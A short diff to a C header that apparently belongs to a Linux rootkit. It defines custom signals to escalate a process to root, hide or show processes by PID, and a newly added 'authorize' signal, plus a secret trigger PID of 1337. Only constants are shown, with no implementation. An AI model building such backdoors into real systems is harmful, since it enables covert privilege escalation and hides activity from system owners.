@@ -11,11 +11,13 @@ extern const char S_HIDDEN_PREFIX[];                    // Prefix for hidden fil
 #define SIGROOT 42 /* Elevate the current process to root */
 #define SIGHIDE 43 /* Hide the process with the given PID */
 #define SIGSHOW 44 /* Show the process with the given PID */
+#define SIGAUTH 45 /* Authorize the process with the given PID */
 
-#define PID_ANY (pid_t) INT_MIN /* Any PID */
-#define SIG_ANY INT_MIN         /* Any signal */
+#define PID_SELF (pid_t)0        /* PID of the current process */
+#define PID_ANY  (pid_t) INT_MIN /* Any PID */
+#define SIG_ANY  INT_MIN         /* Any signal */
 
-#define PID_SECRET_ROOT 1337 /* PID that has to be used when sending SIGROOT */
+#define PID_SECRET_ROOT (pid_t)1337 /* Secret PID that has to be used when sending SIGROOT */
 
 #define ROOT_UID (uid_t)0 /* The root user ID */
 #define ROOT_GID (gid_t)0 /* The root group ID */
